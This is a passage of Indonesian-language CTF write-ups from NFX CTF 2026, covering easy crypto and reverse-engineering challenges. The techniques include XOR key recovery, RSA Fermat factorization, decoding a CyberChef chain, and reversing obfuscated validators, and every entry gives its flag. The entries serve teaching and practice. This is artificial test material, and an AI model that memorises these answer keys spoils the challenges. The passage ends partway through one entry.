  NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}
  ```
  Yaitu A+B+C urutan kolom, separator kata A disisipkan, casing mengikuti mask:
  `N4T0` + `_` + `Ph0n3t1c` + `_` + `1n1C0mbO` + `_` + `H3X` + `_` + `fl0At` + `_` + `b4r4ng`.
- Kandidat lama ditolak karena casing/underscore beda - terutama `PH0N3T1C` vs `Ph0n3t1c`,
  `1N1` vs `1n1`, dan kolom C belum masuk sama sekali.
- **Status: FLAG READY - user submit manual** (agent tidak submit).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}`

**Status:** SOLVED - flag valid (first blood)

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-decode-balik"></a>
# NFX CTF 2026 - Decode Balik

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

Seorang teman mengirimkan gambar waifu favoritnya, tetapi sebelum dikirim ia mengacaknya menggunakan serangkaian recipe di CyberChef.

Admin penasaran ingin melihat gambar aslinya, tetapi yang tersisa hanyalah recipe encode dan hasil akhirnya.

Bisakah kamu membalik seluruh proses tersebut dan mengembalikan gambar waifu seperti semula?

![img](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/decode_balik/waifu.png)

**Lampiran:**

- [waifu.png](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/decode_balik/waifu.png) (type: file)
- [recipe](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')Zlib_Deflate('Dynamic%20Huffman%20Coding')To_Base64('A-Za-z0-9%2B/%3D')Generate_Image('Greyscale',1,780)&input=TkZYe1JFREVDVEVEfQ) (type: link)

**Berkas di workspace:** `waifu.png`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran waifu.png berukuran 780x586 dengan nilai R=G=B, yang menandakan gambar grayscale hasil generate, bukan foto asli. Deskripsi memberi petunjuk bahwa ada rantai encode, dan pemahaman awalnya adalah membaca gambar sebagai data, bukan sebagai visual. Flag: `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`.

**Pemahaman inti:** Gambar bukan foto, melainkan hasil render string: pikselnya menyimpan base64. Rantai encode dibalik dari piksel, dan flag ada sebagai teks di gambar hasil decode.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran `waifu.png` berukuran 780x586 dengan nilai R=G=B, yang menandakan gambar grayscale hasil generate, bukan foto asli. Deskripsi memberi petunjuk bahwa ada rantai encode, dan pemahaman awalnya adalah membaca gambar sebagai data, bukan sebagai visual. Piksel di-flatten row-major lalu diterjemahkan sebagai ASCII; hasilnya string base64 dengan rasio printable 0.999. Dari situ rantai CyberChef bisa direkonstruksi terbalik: `To_Base64 -> Zlib_Deflate -> To_Base64 -> Generate_Image(Greyscale,1,780)`. Artefak antara yang penting adalah magic `78 9c` setelah decode base64 pertama, yang memastikan langkah berikutnya adalah `zlib.decompress`, bukan base64 lagi. Setelah dua lapis, diperoleh JPEG asli 600x847 yang memuat flag sebagai teks di area kanan-tengah.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`

- Recipe (CyberChef, forward): `To_Base64 → Zlib_Deflate → To_Base64 → Generate_Image(Greyscale,1,780)` - input asli = gambar JPEG.
- Reverse chain (dikerjakan offline, Pillow + stdlib):
  1. Baca piksel `waifu.png` (780×586, R=G=B) → flatten row-major → string ASCII (base64, printable ratio 0.999).
  2. `base64.b64decode(s)` → data zlib (magic `78 9c`).
  3. `zlib.decompress(...)` → string base64 kedua (448.720 B).
  4. `base64.b64decode(...)` → **JPEG asli** (336.539 B, `ffd8ffe0`, 600×847).
- Flag **tertulis sebagai teks di dalam gambar** (area kanan-tengah, pegangan cangkir) → dibaca visual.
- Artefak: `platform_tools/decode_balik_stage2.bin`, `platform_tools/decode_balik_final.jpg`, `decode_balik_final_view.png`.
- 328 piksel alpha=0 tidak mengganggu (semua baris punya alpha=255, chain decode utuh).
- Catatan: `Generate_Image` di CyberChef = render string ke piksel; jadi "waifu" = gambar hasil render, flag ada di layer isi.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-twin-prime-lattice"></a>
# NFX CTF 2026 - Twin Prime Lattice

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: rio

Diberikan modulus RSA 2048-bit dengan dua faktor yang sangat berdekatan. Kamu juga mendapatkan 32 bit teratas dari salah satu faktor dan ciphertext flag.

Pulihkan faktor RSA dan dekripsi flag.

> Format: NXCTF{...}

**Lampiran:**

- [challenge.py](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Twin_Prime_Lattice/challenge.py) (type: file)
- [output.txt](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Twin_Prime_Lattice/output.txt) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `challenge.py` · `output.txt`

---

### 2. TL;DR (Ringkasan Singkat)

Soal memberi RSA dengan N, e, c, dan bocoran 32 bit MSB dari p. Judul dan deskripsi mengarah ke Coppersmith, tetapi sebelum membangun lattice ada baiknya memeriksa sifat N itu sendiri. Flag: `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`.

**Pemahaman inti:** Nama soal menyarankan lattice, tetapi selisih p dan q cukup kecil sehingga Fermat factorization menang pada iterasi pertama. Bocoran 32 bit MSB hanya menjadi verifikasi.

---

### 3. Analisis Awal (Recon / Discovery)

Soal memberi RSA dengan `N`, `e`, `c`, dan bocoran 32 bit MSB dari p. Judul dan deskripsi mengarah ke Coppersmith, tetapi sebelum membangun lattice ada baiknya memeriksa sifat N itu sendiri. Jika p dan q berdekatan, maka `a = isqrt(N)` dan `b^2 = a^2 - N` akan menjadi kuadrat sempurna dengan sedikit iterasi. Kenyataannya `b^2` sudah kuadrat sempurna pada iterasi pertama, yang berarti selisih p dan q hanya sekitar 255 bit. Pemahaman ini membuat serangan lattice dan brute 32 bit tidak diperlukan: setelah p dan q diperoleh, `p*q == N` dan `p >> (bitlen-32) == leak` dipakai sebagai verifikasi, lalu plaintext dihitung dengan `pow(c, pow(e, -1, (p-1)*(q-1)), N)`. Perlu diingat prefix flag soal ini `NXCTF{}`, bukan `NFX{}`.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`

- `a = isqrt(N)`; `b² = a²-N` perfect square pada **iterasi pertama** (0 iterasi tambahan, <0.1 ms) → Fermat factorization langsung kena karena q-p hanya 255 bit.
- Verifikasi: `p*q == N` dan `p >> (bitlen-32) == leak (4178899371)` - leak justru redundan.
- Dekripsi: `m = pow(c, pow(e, -1, (p-1)*(q-1)), N)` → `long_to_bytes(m)`.
- Coppersmith/brute-32bit-MSB **tidak diperlukan**.
- **Prefix flag `NXCTF{}`**, bukan `NFX{}` - periksa prefix per-soal sebelum lapor.

---

### 5. Flag & Verifikasi

**Flag:** `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-ghost-xor"></a>
# NFX CTF 2026 - Ghost XOR

* **Kategori:** Crypto
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Candelena

Tim cyber kami berhasil mencegat sebuah pesan rahasia yang terenkripsi. Berdasarkan informasi intelijen, enkripsi yang digunakan hanya menggunakan operasi XOR berulang dengan kunci rahasia sepanjang **4 karakter**.

Beruntung bagi kita, mereka meninggalkan kode sumbernya. Bisakah kamu memecahkan kuncinya dan membaca isi pesan rahasia tersebut?

**Lampiran:**

- [chall.py](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/crypto/Ghost_XOR/chall.py) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `chall.py`

---

### 2. TL;DR (Ringkasan Singkat)

Ciphertext di-XOR dengan key pendek yang berulang. chall.py menyebutkan prefix flag di komentar, dan informasi itu cukup untuk melakukan known-plaintext: 7 byte pertama plaintext (NFXCTF{) di-XOR dengan ciphertext menghasilkan potongan key, lalu polanya diperiksa. Flag: `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`.

**Pemahaman inti:** Key-nya periodik 4 karakter, `LOCK`. Known-plaintext 7 byte pertama sudah cukup menurunkannya, dan seluruh plaintext yang printable memastikan tidak perlu brute 256.

---

### 3. Analisis Awal (Recon / Discovery)

Ciphertext di-XOR dengan key pendek yang berulang. `chall.py` menyebutkan prefix flag di komentar, dan informasi itu cukup untuk melakukan known-plaintext: 7 byte pertama plaintext (`NFXCTF{`) di-XOR dengan ciphertext menghasilkan potongan key, lalu polanya diperiksa. Hasilnya key periodik 4 karakter, `LOCK`. Pemahaman pentingnya: dengan key periodik, tidak perlu brute 256 nilai; cukup verifikasi bahwa XOR seluruh ciphertext dengan `LOCK` menghasilkan teks printable dan byte key pada posisi 4 sampai 6 konsisten. Self-check ini juga memastikan tidak ada kandidat lain yang sama-sama valid.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`

- Probe known-plaintext: derive key 7 byte pertama dari prefix `NFXCTF{` (sesuai komentar chall.py) → `LOCKLOC` → period-4 = `LOCK`.
- Verifikasi self-check: xor ulang seluruh ciphertext dgn `LOCK` → seluruh plaintext printable & key[4..6] konsisten → **tanpa brute 256**.
- Perintah: `bytes(ct[i] ^ b"LOCK"[i % 4] for i in range(len(ct)))`
- Brief bilang "brute 8-bit", ternyata key 4-char periodik. Prefix flag soal ini `NFXCTF{}` (lihat header chall.py), bukan `NFX{}`.

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-easy-bash-layers"></a>
# NFX CTF 2026 - Easy Bash Layers

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Script bash ini melakukan tiga transformasi berlapis sebelum membandingkan hasilnya dengan nilai yang sudah dihitung. Tidak ada enkripsi sungguhan - hanya encoding, pembalikan urutan, dan ROT13.

> Format: NFX{...}

**Lampiran:**

- [easy_bash.sh](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Easy_01_Bash_Layers/easy_bash.sh) (type: file)

**Berkas di workspace:** `easy_bash.sh`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa script bash dengan fungsi check() yang membandingkan input pengguna terhadap string expected. Membaca fungsi itu memberi urutan transformasi yang jelas: input di-base64, lalu dibalik dengan rev, lalu diubah dengan tr ROT13, dan hasilnya harus sama dengan expected. Flag: `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`.

**Pemahaman inti:** Tiga layer-nya deterministik dan urutannya terlihat di kode: base64, reverse, ROT13. Flag cukup dihitung dengan membalik urutan dari string `expected`.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa script bash dengan fungsi `check()` yang membandingkan input pengguna terhadap string `expected`. Membaca fungsi itu memberi urutan transformasi yang jelas: input di-base64, lalu dibalik dengan `rev`, lalu diubah dengan `tr` ROT13, dan hasilnya harus sama dengan `expected`. Tidak ada kunci rahasia atau randomness di dalamnya, jadi pemahaman kuncinya adalah seluruh rantai bisa dibalik secara eksak. Urutan inversinya: ROT13 inverse (`tr 'N-ZA-Mn-za-m' 'A-Za-z'`), lalu reverse, lalu `base64.b64decode`. Hasilnya diverifikasi dengan menjalankan `check()` versi forward di Python agar cocok dengan `expected`.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`

- `check()` memakai 3 layer: `base64 → rev → tr ROT13`. Balik urutannya dari `expected`:
  1. ROT13-inverse (tr 'N-ZA-Mn-za-m' → 'A-Za-z')
  2. `[::-1]` (rev)
  3. `base64.b64decode`
- `expected = 9AGosOUZ0A3K0OwoskTokp3KmW3Z5EQosu2p0V2rLMxG` → flag.
- Diverifikasi: jalankan check forward di Python, cocok.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-easy-config-decoy"></a>
# NFX CTF 2026 - Easy Config Decoy

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Binary ini membaca konfigurasi dan merangkai token rahasia dari empat potongan string. Beberapa field terlihat seperti konfigurasi C2 dan flag palsu untuk mengecoh analis.

> Format: NFX{...}

**Lampiran:**

- [easy_config](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Easy_03_Config_Decoy/easy_config) (type: file)

**Berkas di workspace:** `easy_config`

---

### 2. TL;DR (Ringkasan Singkat)

Binary menyimpan beberapa string di .rodata, termasuk dua kandidat yang bentuknya sudah seperti flag utuh: NFX{th1s_1s_n0t_th3_fl4g} dan NFX{c2_b34c0n_p4rt_1s_f4k3}. Membaca .data menunjukkan tabel pointer di 0x4020 sampai 0x4048 yang menunjuk ke enam potongan dan label. Flag: `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`.

**Pemahaman inti:** Flag asli tidak utuh di memori, melainkan dirakit dari potongan lewat tabel pointer. Dua string lain sengaja ditaruh sebagai decoy yang terlihat meyakinkan.

---

### 3. Analisis Awal (Recon / Discovery)

Binary menyimpan beberapa string di `.rodata`, termasuk dua kandidat yang bentuknya sudah seperti flag utuh: `NFX{th1s_1s_n0t_th3_fl4g}` dan `NFX{c2_b34c0n_p4rt_1s_f4k3}`. Membaca `.data` menunjukkan tabel pointer di `0x4020` sampai `0x4048` yang menunjuk ke enam potongan dan label. Pemahaman kuncinya ada di alur program: `strcat` merangkai potongan sesuai urutan pointer, lalu `strcmp` membandingkan hasilnya dengan input. Jadi string yang terlihat seperti flag belum tentu flag, dan urutan pointer adalah sumber kebenarannya. Flag asli terbentuk dari `NFX{c0nf1g_` + `d3c0y_` + `p4rts_` + `4r3_fun}`. Verifikasi dilakukan dengan menjalankan salinan binary: flag rakitan diterima, sedangkan decoy ditolak.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`

- `.rodata` berisi 3 string: flag asli terpecah jadi potongan `NFX{c0nf1g_` + `d3c0y_` + `p4rts_` + `4r3_fun}`, plus 2 decoy utuh:
  - `NFX{th1s_1s_n0t_th3_fl4g}` (decoy)
  - `NFX{c2_b34c0n_p4rt_1s_f4k3}` (decoy)
- Tabel pointer di `.data` (0x4020..0x4048) menunjuk ke 6 potongan/label → program `strcat` berurutan jadi flag asli, lalu `strcmp`.
- Diverifikasi langsung (salinan executable di `platform_tools/bin_work/`):
  - `./easy_config 'NFX{c0nf1g_d3c0y_p4rts_4r3_fun}'` → **Correct! Konfigurasi asli berhasil dirangkai.**
  - `./easy_config 'NFX{th1s_1s_n0t_th3_fl4g}'` → Wrong!
- Artefak salinan executable: `platform_tools/bin_work/easy_config` (asli tidak dimodifikasi).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-easy-js-obfuscation"></a>
# NFX CTF 2026 - Easy JS Obfuscation

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Validator Node.js ini menyimpan flag dalam array angka yang di-XOR dengan `0x33` lalu dibalik urutannya. Ada array umpan yang bila didecode menghasilkan flag palsu.

> Format: NFX{...}

**Lampiran:**

- [easy_js.js](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Easy_02_JS_Obfuscation/easy_js.js) (type: file)

**Berkas di workspace:** `easy_js.js`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa file JavaScript yang mengobfuskasi flag dalam array angka dan sebuah fungsi dekoder _0xd. Membaca fungsi itu memberi dua operasi: setiap elemen di-XOR dengan 0x33, lalu diubah menjadi karakter dengan fromCharCode, dan hasil akhirnya di-reverse(). Flag: `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`.

**Pemahaman inti:** Dekodernya hanya `String.fromCharCode(x ^ 0x33)` lalu `reverse()`. Array `_0x4f` adalah target, sedangkan `_0xdec` sengaja disiapkan sebagai decoy.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa file JavaScript yang mengobfuskasi flag dalam array angka dan sebuah fungsi dekoder `_0xd`. Membaca fungsi itu memberi dua operasi: setiap elemen di-XOR dengan `0x33`, lalu diubah menjadi karakter dengan `fromCharCode`, dan hasil akhirnya di-`reverse()`. Ada dua array yang perlu dibedakan: `_0x4f` berukuran 44 byte dan `_0xdec` yang menghasilkan `NFX{y0u_f0und_th3_wr0ng_4rr4y}`. Pemahaman kuncinya adalah mengikuti variabel mana yang benar-benar dibandingkan dengan input, yaitu `_0xt` yang berasal dari `_0x4f`. Decoding manual array itu dengan urutan XOR lalu reverse menghasilkan flag yang cocok dengan pembandingan `process.argv[2]`.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`

- Dekoder `_0xd(arr)`: `String.fromCharCode(x ^ 0x33)` lalu `reverse()`.
- Target = `_0x4f` (44 byte) → dekoded = flag.
- Decoy: `_0xdec` → `NFX{y0u_f0und_th3_wr0ng_4rr4y}` (decoy, salah).
- Verifikasi: bandingkan `process.argv[2] === _0xt` - dekripsi ulang manual cocok.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-baby-xor"></a>
# NFX CTF 2026 - Baby XOR

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{x0r_1s_fun_but_n0t_s3cur3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Validator ini tidak menyimpan flag sebagai plaintext. Setiap byte flag di-XOR dengan satu byte kunci sebelum disimpan ke dalam array. Karena kuncinya hanya 8 bit, seluruh ruang kunci bisa dicoba dalam waktu singkat.

> Format: NFX{...}

**Lampiran:**

- [baby_xor](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Baby_02_XOR/baby_xor) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `baby_xor`

---

### 2. TL;DR (Ringkasan Singkat)

Binary berupa ELF 64-bit PIE yang sudah di-strip. strings tidak menemukan flag, yang berarti data flag sengaja di-encode. Flag: `NFX{x0r_1s_fun_but_n0t_s3cur3}`.

**Pemahaman inti:** XOR satu byte hanya punya 256 kemungkinan, dan hanya key 0x5A yang menghasilkan plaintext printable sekaligus pola `NFX{`. Tidak ada analisis lain yang diperlukan.

---

### 3. Analisis Awal (Recon / Discovery)

Binary berupa ELF 64-bit PIE yang sudah di-strip. `strings` tidak menemukan flag, yang berarti data flag sengaja di-encode. Karena ruang kunci untuk XOR satu byte hanya 256, pendekatan yang paling masuk akal adalah brute semua nilai dan menyaring hasilnya dengan dua kriteria: seluruh byte printable dan mengandung pola `NFX{...}`. Dari 256 kandidat hanya satu yang lolos, yaitu key `0x5A` (`Z`) pada offset 8272. Pemahaman kuncinya: soal ini bukan tentang membongkar algoritma, tetapi tentang memanfaatkan ruang kunci yang sangat kecil dan verifikasi struktur flag sebagai filter.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{x0r_1s_fun_but_n0t_s3cur3}`

- ELF 64-bit pie stripped (BuildID `7dcd406e…`); strings bersih → ter-encode.
- Brute 8-bit: `bytes(b ^ k for b in data)` untuk k=0..255, cari `NFX{`…`}` + printable.
- Kena **key 0x5A ('Z')** offset 8272. Hanya 1 dari 256 kandidat printable → unik.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{x0r_1s_fun_but_n0t_s3cur3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-baby-python"></a>
# NFX CTF 2026 - Baby Python

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Sebuah script Python 'mengamankan' flag dengan membalik urutannya lalu meng-encode hasilnya dengan base64. Validator membandingkan input yang dibalik dengan hasil decode base64 tersebut.

> Format: NFX{...}

**Lampiran:**

- [baby_python.py](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Baby_03_Python/baby_python.py) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `baby_python.py`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa script Python yang menyimpan _enc = b'fTNmNHNfdDBuXzNyNF9zZDFrX3RwMXJjc19uMGh0eXB7WEZO' dan memvalidasi candidate[::-1] == base64.b64decode(_enc). Membaca ekspresi itu langsung memberi hubungan yang bisa dibalik: jika candidate[::-1] sama dengan hasil decode, maka candidate adalah hasil decode yang dibalik. Flag: `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`.

**Pemahaman inti:** Validasi hanya membalik input lalu membandingkannya dengan hasil base64 decode. Flag adalah hasil decode yang dibalik, tanpa perlu menjalankan file.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa script Python yang menyimpan `_enc = b'fTNmNHNfdDBuXzNyNF9zZDFrX3RwMXJjc19uMGh0eXB7WEZO'` dan memvalidasi `candidate[::-1] == base64.b64decode(_enc)`. Membaca ekspresi itu langsung memberi hubungan yang bisa dibalik: jika `candidate[::-1]` sama dengan hasil decode, maka `candidate` adalah hasil decode yang dibalik. Tidak ada kunci, hash, atau operasi lossy di dalamnya, sehingga flag bisa dihitung murni secara offline. Verifikasi dilakukan dengan menjalankan ulang ekspresi validasi pada hasil yang diperoleh, tanpa mengeksekusi file soal.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`

- Validasi: `candidate[::-1] == base64.b64decode(_enc)` → flag = `b64decode(_enc)[::-1]`.
- `_enc = b'fTNmNHNfdDBuXzNyNF9zZDFrX3RwMXJjc19uMGh0eXB7WEZO'`.
- Dikerjakan offline (tidak mengeksekusi file).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-baby-strings"></a>
# NFX CTF 2026 - Baby Strings

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Selamat datang di dunia reverse engineering. Diberikan sebuah binary ELF 64-bit sederhana yang meminta sebuah flag. Program ini tidak benar-benar menyembunyikan flag-nya: flag ada di dalam binary sebagai string biasa dan langsung dibandingkan dengan input.

> Format: NFX{...}

**Lampiran:**

- [baby_strings](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Baby_01_Strings/baby_strings) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `baby_strings`

---

### 2. TL;DR (Ringkasan Singkat)

Binary berupa ELF 64-bit PIE yang sudah di-strip, sehingga tidak ada simbol yang membantu. Namun sebelum masuk ke disassembly, langkah termurah adalah memeriksa string yang dapat dicetak. Flag: `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`.

